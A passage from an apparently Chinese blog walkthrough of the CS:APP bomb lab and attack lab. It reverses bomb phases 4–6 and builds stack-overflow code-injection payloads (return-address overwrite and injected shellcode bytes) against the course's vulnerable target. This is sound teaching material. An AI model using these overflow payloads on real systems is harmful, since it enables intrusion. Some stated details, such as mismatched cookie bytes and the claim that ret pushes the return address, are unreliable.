$0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p>还是用的<code>sscanf</code>来提取输入的整数, 且这次只能输入两个.</p>
<p>这道题强烈推荐使用 ida 的生成伪代码的功能.</p>
<p>phase_4 :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">phase_4</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_sscanf(a1, <span class="string">"%d %d"</span>, &amp;v2, &amp;v3) != <span class="number">2</span> || v2 &gt; <span class="number">0xE</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  result = func4(v2, <span class="number">0L</span>L, <span class="number">14L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result || v3 )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>func4 :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = ((<span class="keyword">signed</span> <span class="keyword">int</span>)a3 - (<span class="keyword">signed</span> <span class="keyword">int</span>)a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)func4(a1, a2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a1 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)func4(a1, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析代码可知, 最简单的一种情况就是 fun4 中的两个if分支都不要进入(不然会进入递归), 那么也就是需要 <code>v3 = a1</code>, 即<code>a1 = ((signed int)a3 - (signed int)a2) / 2 + a2</code>, 其中 a1 为输入的第一个数, a2=0, a3=14. 计算得出a1 = 7.<br>且由 phase_4 中的代码, 输入的第二个数(v3)一定是0.<br>那么一组答案就是 7 0.</p>
<p>但是刚才并没有考虑进入递归的情况, 如果考虑递归, 可以把这段代码写成C语言的程序, 将第一个输入从0 到 14遍历. </p>
<h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>ida 伪代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">phase_5</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">6</span>]; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+16h] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)string_length((_BYTE *)a1) != <span class="number">6</span> )</span><br><span class="line">    explode_bomb(a1);</span><br><span class="line">  v1 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3[v1] = array_3449[*(_BYTE *)(a1 + v1) &amp; <span class="number">0xF</span>];</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != <span class="number">6</span> );</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)strings_not_equal(v3, <span class="string">"flyers"</span>) )</span><br><span class="line">    explode_bomb(v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由代码和使用调试器分析可知, 每次我们输入的字符串<code>input</code>的各位会被取出来和<code>0xF</code>相与, 结果会被作为字符串<code>source = &quot; aduiersnfotvbyl&quot;</code>的下标<code>index = input[i]&amp;0xF</code>. <strong>注意source的第一个字符为空格.</strong><br>再根据此下标<code>index</code>取出字符串中的相应字符<code>source[index]</code>保存于另一个字符串<code>result</code>中, 只有最后<code>result = &quot;flyers&quot;</code>才算成功. </p>
<p>用下面的表可以得出 password.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">source:</span><br><span class="line">  a d u i e r s n f   o   t   v   b   y   l</span><br><span class="line"></span><br><span class="line">0 1 2 3 4 5 6 7 8 9  10  11  12  13  14  15</span><br><span class="line"></span><br><span class="line">0x0     .......     0xa 0xb 0xc 0xd 0xe 0xf </span><br><span class="line"></span><br><span class="line">target:</span><br><span class="line">   f    l    y    e    r    s</span><br><span class="line"></span><br><span class="line">   9   15   14    5    6    7</span><br><span class="line"></span><br><span class="line">0x39 0x3f 0x3e 0x35 0x36 0x37</span><br><span class="line"></span><br><span class="line">password:</span><br><span class="line">   9    ?    &gt;    5    6    7</span><br></pre></td></tr></table></figure>

<h4 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h4><p>仍然用 IDA 生成了伪代码</p>
<ul>
<li>第一部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v1 = &amp;v15;</span><br><span class="line">  read_six_numbers(a1, &amp;v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_DWORD *)v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb(a1, &amp;v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v1 == *((_DWORD *)&amp;v15 + v3) )</span><br><span class="line">        explode_bomb(a1, &amp;v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    v1 = (__int64 *)((<span class="keyword">char</span> *)v1 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>根据之前的经验, 这里是读了6个数字 , 每个数字必须小于7. 并且通过循环遍历, 确保了两两之间都不相同. </p>
<ul>
<li>第二部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 = &amp;v15;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">7</span> - *(_DWORD *)v4;</span><br><span class="line">    v4 = (__int64 *)((<span class="keyword">char</span> *)v4 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v16 );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里把我们输入的每个数都改为了 7 与此数的差.</p>
<ul>
<li>第三部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *(_DWORD *)((<span class="keyword">char</span> *)&amp;v15 + v5);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_QWORD *)v6[<span class="number">1</span>];</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != v8 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(__int64 *)((<span class="keyword">char</span> *)&amp;v17 + <span class="number">2</span> * v5) = (__int64)v6;</span><br><span class="line">    v5 += <span class="number">4L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里有个变量名为 node.<br>通过在调试器中分析, 弄清楚了其本质是结构体, 推测定义为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试器中内存的值:</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/bomb/7.png" alt title class>
                <p></p>
            </figure>

<p>所以这部分代码会通过我们输入的序号取出对应的node并依次排列.</p>
<ul>
<li>第四部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = &amp;v18;</span><br><span class="line">  <span class="keyword">for</span> ( i = v17; ; i = v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *v10;</span><br><span class="line">    *(_QWORD *)(i + <span class="number">8</span>) = *v10;</span><br><span class="line">    ++v10;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == &amp;v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这部分代码应该是把新排列的 node 的指针相连接. 不过对后面的题目影响似乎不是很大.</p>
<ul>
<li>第五部分:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)(v12 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v9 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)result )</span><br><span class="line">      explode_bomb(a1, &amp;v19);</span><br><span class="line">    v9 = *(_QWORD *)(v9 + <span class="number">8</span>);</span><br><span class="line">    --v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这里把六个新排好序的节点按内存中相邻的顺序检查是否前一个的value大于后一个, 如果不是就会爆炸. </p>
<p>这六个的值分别是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node1 node2 node3 node4 node5 node6</span><br><span class="line">0x14c 0x0a8 0x39c 0x2b3 0x1dd 0x1bb</span><br></pre></td></tr></table></figure>

<p>排序后就是<code>3 4 5 6 1 2</code></p>
<p>加上之前那 “7 减”的操作, 就成了<code>4 3 2 1 6 5</code>, 即为 password.</p>
<h3 id="attack-lab"><a href="#attack-lab" class="headerlink" title="attack lab"></a>attack lab</h3><p>进行三次代码注入攻击!</p>
<h4 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h4><p>目标: 通过<code>gets()</code>函数的栈溢出漏洞, 利用输入的字符串覆盖栈外的 <code>retaddr</code> 为某个地址, 使程序运行一段通常情况下不会执行的代码, 也就是<code>retaddr</code>所保存的新的地址值处的代码.  </p>
<p>使用调试器, 查看反编译的汇编代码, 发现<code>sub    $0x28,%rsp</code>可知栈的大小.</p>
<p>如果用 IDA 查看栈的结构. <code>getbuf()</code>函数的反汇编伪代码为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个小细节, <code>char bur[]</code>后面标注的是<code>[rsp+0h] [rbp-28h]</code>这个内存范围. 也就是这片函数栈帧的2*16+8=40字节大小. 然而下标处却写的是32(字节). 还有8 byte 存放的是原先的 ebp 的值.</p>
<p>此处的函数栈结构应为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">               +-----------------+</span><br><span class="line">               |     retaddr     |</span><br><span class="line">               +-----------------+</span><br><span class="line">               |    saved ebp    |</span><br><span class="line">        rbp -&gt; +-----------------+</span><br><span class="line">               |    buf[24:32]   |</span><br><span class="line">               |    buf[16:24]   |</span><br><span class="line">               |    buf[8:16]    |</span><br><span class="line">               |    buf[0:8]     |</span><br><span class="line">rbp-32, rsp -&gt; +-----------------+</span><br></pre></td></tr></table></figure>

<p>如果要让数据溢出到<code>retaddr</code>, 需要构造<code>payload = &#39;a&#39;*32 + &#39;b&#39;*8 + targetaddr</code>. </p>
<p>再查看下<code>touch1</code>的函数地址, 为<code>0x00 00 00 00 00 40 17 C0</code>. 考虑到大端序到小端序的转换应为<code>0x00 00 00 00 c0 17 40 00</code>. </p>
<p>用<code>hex2raw</code>工具进行不可见字符的输入, 构造文本文件例如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*       &apos;a&apos;*32       */</span><br><span class="line">31 31 31 31  31 31 31 31 </span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">/*       &apos;b&apos;*8        */</span><br><span class="line">65 65 65 65  65 65 65 65</span><br><span class="line">/*   target address   */</span><br><span class="line">c0 17 40 00  00 00 00 00</span><br><span class="line">/*        \n          */</span><br><span class="line">0a</span><br></pre></td></tr></table></figure>

<p>跑一下, 没有问题.</p>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%24R%25S7Z%7BRVOR0MUSD0CHE8%40T.png" alt title class>
                <p></p>
            </figure>
<h4 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h4><p>这个任务需要在调用touch2后进入if为真的分支中, 这需要满足条件<code>val==cookie</code>.</p>
<p>根据指导书中的提示, val作为调用函数的参数, 它的值是被保存在寄存器<code>$rdi</code>中的. 也就是在实现地址跳转到<code>touch2</code>的同时还要想办法修改寄存器的值. </p>
<p>成功的流程应该为 : </p>
<ol>
<li>在<code>getbuf()</code>中栈溢出.</li>
<li>设置<code>$rdi</code>的值为cookie.</li>
<li>跳转到<code>touch2()</code></li>
<li>进入<code>if(true)</code>, 调用<code>validate()</code></li>
</ol>
<p>所以关键就是如何栈溢出后能设置寄存器的值, 并且再跳转到<code>touch2()</code></p>
<p>解决的方法是注入指令代码: 通过把ret的地址值覆盖为栈顶的指针(也就是我们字符串的首地址), 能够让字符串(的二进制对应机器码)作为指令运行起来.</p>
<p>通过注入指令修改寄存器<code>$rdi</code>的值很容易实现, 只要一个mov指令就可以了. 那么如何通过指令跳转到目标的地址呢? 为了这个疑问, 我又在书上和网上查找了很多资料, 最后搞清楚了这个问题. 在普通的函数调用执行<code>call指令</code>时, 程序会记录下call的下一条指令的地址来使将来能返回到正确的地址. 不过这一步并非是编译器来完成, 而是CPU负责的, CPU在执行ret时, 会将<code>$ip(程序计数器)</code>的值压入栈中, 也就形成了如图的<code>retaddr</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">               +-----------------+</span><br><span class="line">               |     retaddr     |</span><br><span class="line">               +-----------------+</span><br><span class="line">               |    saved ebp    |</span><br><span class="line">        rbp -&gt; +-----------------+</span><br><span class="line">               |    buf[24:32]   |</span><br><span class="line">               |    buf[16:24]   |</span><br><span class="line">               |    buf[8:16]    |</span><br><span class="line">               |    buf[0:8]     |</span><br><span class="line">rbp-32, rsp -&gt; +-----------------+</span><br></pre></td></tr></table></figure>

<p>当CPU执行<code>ret</code>前, 编译器会先执行<code>sub %rsp</code>, 也就是将<code>$rsp</code>的值设为<code>retaddr</code>这部分内存的地址, 再执行<code>ret</code>, CPU会将<code>rsp</code>中的值赋给寄存器<code>$ip</code>, 这样程序的指令就会从调用前的位置继续执行. 换言之, 如果执行<code>ret</code>指令时<code>$rsp</code>所指向的位置的值不是一个有效的指令地址, 那么程序一定会出错的. </p>
<p>言归正传, 理解了这些就好办了. 只要先push一下, 让<code>$rsp</code>再向下移动一个单位,同时向此处写入要跳转的地址, 然后ret就可以实现了, 先写出汇编语言 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>使用gcc将这几行代码编译为机器指令后再用 <code>objdump</code> 反汇编出字节码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>把这段字节码写入 payload 中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/* 指令 */</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00 </span><br><span class="line">c3 </span><br><span class="line">31 31 31 </span><br><span class="line">/* 占位 */</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line"></span><br><span class="line">65 65 65 65</span><br><span class="line">65 65 65 65 </span><br><span class="line">/* 栈顶 */</span><br><span class="line">78 dc 61 55 </span><br><span class="line">00 00 00 00</span><br><span class="line">0a</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%5DCQ%60UP2NYY%25%602U%29R8~Z5WMF.png" alt title class>
                <p></p>
            </figure>
<ul>
<li>一开始的错误思路 :<ul>
<li>企图尝试直接插入能修改rip寄存器的代码实现跳转, 不成.</li>
<li>误认为 ret 每次都会将同一内存地址的值赋值给$rip, 事实上因为pop弹出的是栈顶的值, 所以并非同一地址.</li>
</ul>
</li>
</ul>
<h4 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h4><p>首先要先明确思路. 这个任务应该通过栈溢出进入touch3并且进入validate(3)所在的if分支. 这也必须满足条件<code>hexmatch(cookie, sval)</code>为真. sval是调用touch3时传入的参数, 变量类型是char指针. 这里可以通过类似任务二中的方法来修改这个指针保存的地址到我们注入的payload字符串所在的地址. 但是问题的关键在于, 当进入<code>touch3</code>后, 程序调用了<code>hexmatch()</code>这个函数. 由于在进入<code>validate</code>前<code>getbuf</code>函数已经完成了退栈操作, 那么<code>hexmatch()</code>这个函数的帧栈一定会把之前<code>getbuf</code>函数帧栈所在的地址覆盖掉, 因为<code>char cbuf[110]</code>申请了110个字节的大小, 更不用说之后还有<code>sprintf</code>和<code>strncmp</code>这两个函数. 那么这样就会被把我们注入的字符串的值破坏掉, 就算把 sval 的指针指向这里也没用. 所以成功的关键在于把这个字符串保存在安全的地址中. 由栈的结构可知, 后来调用的函数必然不会覆盖调用者的地址, 所以<code>getbuf</code>之前的地址绝对是安全的, 且通过溢出能被我们修改. 也就是说, 这次的构造的注入的字符串还需要更长一些, 溢出到<code>test</code>函数中.</p>
<p>除此之外, 还应该构造出能满足分支条件的字符串. <code>hexmatch(unsigned val, char *sval)</code>的作用于在其中调用的<code>sprintf(s, &quot;%.8x&quot;, val)</code>和<code>strncmp(sval, s ,9)</code>这两个函数有关. 前一个函数在这里的作用是将参数<code>val</code>格式化为字符串并且保存在 s 中, <code>%.8x</code>指明了val是一个八位的16进制数. 而<code>strncmp(sval, s ,9)</code>顾名思义就是将这两个字符串的前9位进行比较(比8位多一位是要考虑结束符’\0’), 如果相同返回 0. 显然这里为了程序正确执行是需要返回 0 的. 那么构造字符串也简单了, 就根据cookie 的值来翻译成对应字符就行了. 但是在运行程序时因为是从<code>hex2raw</code>中读取, 所以还是需要提前再转为16进制码的.</p>
<p>设置跳转指令的部分和任务二没什么区别, 这样就可以写出汇编代码并且反编译了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">c3                      retq</span><br></pre></td></tr></table></figure>

<p>构造注入的字符串的十六进制编码.</p>
